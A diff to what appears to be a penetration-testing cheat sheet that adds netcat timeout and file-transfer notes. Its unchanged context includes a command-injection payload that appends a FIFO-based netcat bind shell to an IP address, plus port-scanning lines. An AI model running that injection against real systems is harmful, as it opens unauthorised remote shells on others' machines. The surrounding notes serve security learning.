@@ -55,9 +55,17 @@ nmap -A IP
 192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
 ```
 
-* TCP scanning with `nc`
+* TCP scanning with `nc`. `-w` specifies timeout in seconds. 
 ```bash
 nc -nvv -w 1 -z 127.0.0.1 1000-2000
+```
+* Transfer file with `nc`! `-n` for numeric only IP addresses.
+```bash
+# Receiver
+nc -nlvp 1337 > recv.txt
+
+# Sender
+nc 127.0.0.1 1337 < file.txt
 ```
 
 * Scanning all services given a server with `nmap`
